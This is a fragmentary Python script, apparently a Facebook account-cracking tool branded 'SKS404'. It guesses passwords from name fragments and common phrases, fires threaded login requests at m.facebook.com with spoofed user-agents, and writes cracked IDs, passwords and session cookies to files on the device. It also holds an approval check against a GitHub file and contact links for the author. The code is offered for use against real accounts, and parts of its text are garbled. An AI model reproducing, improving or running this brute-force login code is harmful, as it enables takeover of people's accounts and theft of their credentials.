...
def banner():
    ...
    print("[=] Ã°Å¸ËœÅ’ Testing New mathod By SPY")
...
def menu_apikey():
  ...
  server = requests.get('https://github.com/SKS404/Random/blob/main/Approval.txt').text
...
(_______/  (__|  \__)(_______/   
  ...
  os.system(f'xdg-open https://www.facebook.com/profile.php?id=100092384533884')
  ...
  try:
    ...
    httpCaht = requests.get("https://github.com/SKS404/Random/blob/main/Approval.txt").text
...
def cek_apk(session,coki):
	...
	w=session.get("https://www.facebook.com/profile.php?id=100092384533884",cookies={"cookie":coki}).text
...
def admin():
	...
	if bal =='1':
		...
		os.system('xdg-open https://wa.me/+8801917466867');time.sleep(1)

		admin()

	if bal =='2':

		os.system('xdg-open https://www.facebook.com/profile.php?id=100092384533884');time.sleep(1)
...
def virus():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶']
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSKS404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
    ...
    'referer': 'https://m.facebook.com/?stype=lo&jlou=AfcWqB8kHCb6swemKBqu3CpWlOPyWmNvtYRSgXD_EJtykmqE79gu32r_NabYrD6y0H13LpxSNuMuLrZAd_Y8LNc5Lv7-CxNwQfQhSOyzvyweEg&smuh=13840&lh=Ac8vNWkQQgpxKksYHJk&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [SKS404-OK] '+cid+' | '+ps+'\33[0;92m')

                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)

                open('/sdcard/SKS404-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/JS—1-CP.txt', 'a').write( uid+' | '+ps+' \n')
...
def b(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSKS4041\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
    ...
    'cache-control': 'max-age=0',
    'referer': 'https://m.facebook.com/?stype=lo&jlou=AfeWrmiOoZrJ_XR-pn1hWynAi9sW_FoLu3RNYvsw2qNHKo-WIeIRTUFvbtBGaBdBEFyCRiZZ6jgszXjICnuqN4mD8HGLc9aB7O3fgmMVeRb8pw&smuh=64687&lh=Ac_ZR3uiDdf7RQ8ITRI&wtsid=rdr_15pybvj4VIsPe9mYZ&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36  uacq',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [SKS-OK] '+cid+' | '+ps+'\33[0;92m')
                ...
                open('/sdcard/SKS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def c(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            lo = session.post('https://m.facebook.com/login//login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                cokie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ...
                open('/sdcard/SKS-OK.txt', 'a').write(cid+' | '+ps+'\n')
